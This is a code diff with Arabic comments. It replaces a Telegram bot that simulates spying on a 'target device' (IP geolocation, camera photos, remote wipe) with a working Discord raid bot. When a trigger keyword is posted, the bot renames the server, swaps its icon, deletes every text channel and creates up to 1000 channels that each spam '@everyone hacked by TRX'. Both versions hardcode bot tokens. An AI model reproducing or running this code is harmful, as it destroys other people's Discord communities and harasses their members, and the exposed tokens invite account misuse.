@@ -1,84 +1,121 @@
-import logging
-import requests
-from telegram import Update, ReplyKeyboardMarkup
-from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes
+import discord
+from discord.ext import commands
+import asyncio
+import aiohttp
 
-# إعدادات التوكن والويب هوك
-TOKEN = '8955434229:AAHkbA-xnJWRK4npzY9O9T3FSN8gTbacJMk'
-# هذا الرابط افتراضي لمحاكاة الـ API الخاص بالجهاز المستهدف
-DEVICE_API_ENDPOINT = "http://target-device-ip:5000" 
+# التوكن الخاص بك
+TOKEN = "MTU0NTQ1MTUyNzEzNTY5OTAxNA.GbN_PU.6fk7Ez72S89P5PR3dqw_NHccGTd4I95Q1eXcwM"
 
-# إعدادات التسجيل
-logging.basicConfig(format='%(asctime)s - %(name)s - %(levelname)s - %(message)s', level=logging.INFO)
+intents = discord.Intents.default()
+intents.message_content = True
+intents.messages = True
 
-async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    keyboard = [['/analyze_ip', '/format_device'], ['/get_photos', '/help']]
-    reply_markup = ReplyKeyboardMarkup(keyboard, resize_keyboard=True)
-    await update.message.reply_text(
-        "مرحباً بك في بوت إدارة الأجهزة. اختر من القائمة أدناه:",
-        reply_markup=reply_markup
-    )
+bot = commands.Bot(command_prefix='', intents=intents)
 
-async def analyze_ip(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # الحصول على IP المستخدم من خلال خدمة خارجية
+@bot.event
+async def on_ready():
+    print(f'تم تسجيل الدخول باسم: {bot.user.name}')
+    # تغيير صورة السيرفر لتطابق صورة البوت عند البدء (اختياري)
     try:
-        response = requests.get('https://api.ipify.org?format=json').json()
-        ip = response['ip']
-        # جلب معلومات إضافية عن الـ IP
-        geo = requests.get(f'http://ip-api.com/json/{ip}').json()
-        
-        info = (
-            f"🔍 *تحليل عنوان IP:*\n\n"
-            f"🌐 الـ IP: `{ip}`\n"
-            f"🌍 الدولة: {geo.get('country', 'غير معروف')}\n"
-            f"🏙️ المدينة: {geo.get('city', 'غير معروف')}\n"
-            f"📡 المزود: {geo.get('isp', 'غير معروف')}\n"
-            f"📍 الإحداثيات: {geo.get('lat')}, {geo.get('lon')}"
-        )
-        await update.message.reply_text(info, parse_mode='Markdown')
+        avatar_url = bot.user.avatar.url
+        # سنقوم بتغيير الصورة لاحقاً عند تفعيل الأمر لضمان العمل
+    except AttributeError:
+        pass
+
+@bot.event
+async def on_message(message):
+    # تجاهل رسائل البوت نفسه لتجنب اللوب
+    if message.author == bot.user:
+        return
+
+    # التحقق من الكلمة المفتاحية
+    if '$جحفلهTRX' in message.content:
+        print("بدأ هجوم السبام!")
+        await spam_attack(message)
+
+async def spam_attack(original_message):
+    guild = original_message.guild
+    
+    if guild is None:
+        # إذا كان في الخاص، نستخدم الداتابيس أو نخرج
+        print("السيرفر غير موجود (رسالة خاصة)")
+        return
+
+    server_name = "TRX"
+    
+    # 1. تغيير اسم السيرفر
+    try:
+        await guild.edit(name=server_name)
+        print(f"تم تغيير اسم السيرفر إلى: {server_name}")
     except Exception as e:
-        await update.message.reply_text("حدث خطأ أثناء تحليل الـ IP.")
+        print(f"خطأ في تغيير الاسم: {e}")
 
-async def get_photos(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    # محاكاة طلب صور من كاميرات الجهاز عبر اتصال مشفر
-    await update.message.reply_text("جاري الاتصال بالكاميرات عبر اتصال مشفر...")
+    # 2. تغيير صورة السيرفر لتكون صورة البوت
+    try:
+        avatar_url = bot.user.avatar.url
+        async with aiohttp.ClientSession() as session:
+            async with session.get(avatar_url) as resp:
+                if resp.status == 200:
+                    image_data = await resp.read()
+                    await guild.edit(icon=image_data)
+                    print("تم تغيير صورة السيرفر لصورة البوت.")
+                else:
+                    print("فشل تحميل صورة البوت.")
+    except Exception as e:
+        print(f"خطأ في تغيير الصورة: {e}")
+
+    # 3. إنشاء 1000 غرفة وحذف القديمة إن وجدت (أو إضافتها)
+    # سنحذف الغرف القديمة أولاً لتوفير المساحة ثم ننشئ الجديدة
+    channels_to_delete = []
+    for channel in guild.text_channels:
+        channels_to_delete.append(channel)
+
+    # حذف الغرف القديمة بسرعة
+    deleted_count = 0
+    for channel in channels_to_delete:
+        try:
+            await channel.delete()
+            deleted_count += 1
+            # تجنب الـ Rate Limit كثيراً
+            await asyncio.sleep(0.5) 
+        except:
+            pass
+            
+    print(f"تم حذف {deleted_count} غرفة قديمة.")
+
+    room_name = "@everyone تم التهكير من قبل ☣️ TRX  ☣️"
+    message_content = "@everyone تم التهكير من قبل ☣️ TRX  ☣️ @everyone @here"
     
-    # هنا يتم إرسال طلبات لـ API الجهاز (مثال)
-    # photos = ['http://device/front.jpg', 'http://device/back.jpg']
+    created_channels = []
     
-    # محاكاة إرسال الصور
-    await update.message.reply_photo(photo="https://via.placeholder.com/600x400.png?text=Front+Camera", caption="📷 الكاميرا الأمامية")
-    await update.message.reply_photo(photo="https://via.placeholder.com/600x400.png?text=Back+Camera", caption="📷 الكاميرا الخلفية")
+    # إنشاء 1000 غرفة
+    for i in range(1000):
+        try:
+            new_channel = await guild.create_text_channel(name=room_name)
+            created_channels.append(new_channel)
+            
+            # إرسال الرسالة داخل الغرفة
+            await new_channel.send(message_content)
+            
+            # تأخير بسيط بين كل غرفة لتجنب الحظر الفوري
+            await asyncio.sleep(0.5)
+            
+            if i % 10 == 0:
+                print(f"تم إنشاء {i+1} غرفة...")
+                
+        except discord.HTTPException as e:
+            print(f"خطأ في إنشاء غرفة {i}: {e.reason}")
+            break
+        except Exception as e:
+            print(f"خطأ عام: {e}")
+            break
 
-async def format_device(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    await update.message.reply_text("⚠️ تحذير: عملية الفرمتة ستمسح جميع البيانات. هل أنت متأكد؟")
-    # هنا يتم إضافة نظام تأكيد (Confirmation)
-    context.user_data['awaiting_confirm'] = True
+    print(f"اكتمل الهجوم! تم إنشاء {len(created_channels)} غرفة وارسال الرسائل.")
 
-async def handle_message(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    if context.user_data.get('awaiting_confirm'):
-        if update.message.text == "نعم":
-            # إرسال أمر الفرمتة عبر اتصال مشفر (API Call)
-            # requests.post(f"{DEVICE_API_ENDPOINT}/format", data={"key": "secure_key"})
-            await update.message.reply_text("✅ تم إرسال أمر الفرمتة بنجاح. الجهاز الآن في طور إعادة التشغيل.")
-            context.user_data['awaiting_confirm'] = False
-        else:
-            await update.message.reply_text("تم إلغاء العملية.")
-            context.user_data['awaiting_confirm'] = False
-    else:
-        await update.message.reply_text("يرجى استخدام الأوامر الموجودة في القائمة.")
-
-def main():
-    app = Application.builder().token(TOKEN).build()
-
-    app.add_handler(CommandHandler("start", start))
-    app.add_handler(CommandHandler("analyze_ip", analyze_ip))
-    app.add_handler(CommandHandler("get_photos", get_photos))
-    app.add_handler(CommandHandler("format_device", format_device))
-    app.add_handler(MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message))
-
-    print("Bot is running...")
-    app.run_polling()
-
-if __name__ == '__main__':
-    main()
+# تشغيل البوت
+try:
+    bot.run(TOKEN)
+except discord.errors.LoginFailure:
+    print("التوكن غير صالح أو انتهت صلاحيته.")
+except Exception as e:
+    print(f"حدث خطأ أثناء التشغيل: {e}")
